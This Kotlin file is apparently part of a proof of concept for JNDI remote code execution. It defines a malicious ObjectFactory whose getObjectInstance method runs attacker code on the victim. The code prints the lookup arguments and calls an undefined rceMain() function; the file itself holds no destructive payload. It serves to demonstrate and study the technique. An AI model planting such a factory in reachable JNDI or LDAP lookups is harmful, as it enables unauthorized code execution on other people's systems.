// Factory class for RCE
//
// The victim will download this `FactoryClass` in an attempt to construct a
// `MadeClass` object. In doing so, it will call the `getObjectInstance` method.
// Normally, this would return the object pointed to in the registry.
//
// However, this code is executed on the victim, and thus provides a vector for
// remote code execution.


import javax.naming.spi.ObjectFactory

import java.util.Hashtable

import javax.naming.Name
import javax.naming.Context


class FactoryClass: ObjectFactory {
    override fun getObjectInstance(
        obj: Any?,
        name: Name,
        nameCtx: Context,
        env: Hashtable<*,*>
    ): MadeClass {

        // Add instrumentation
        println("RCE Acheived!")
        println("    obj:     " + obj.toString())
        println("    name:    " + name.toString())
        println("    nameCtx: " + nameCtx.toString())
        println("    env:     " + env.toString())

        // Do whatever we want
        rceMain()

        // We could choose not to return
        // However, the caller is expecting an object of type MadeClass. I
        //  choose to give them something. It might be useful for further
        //  instrumentation.
        return MadeClass()
    }
}
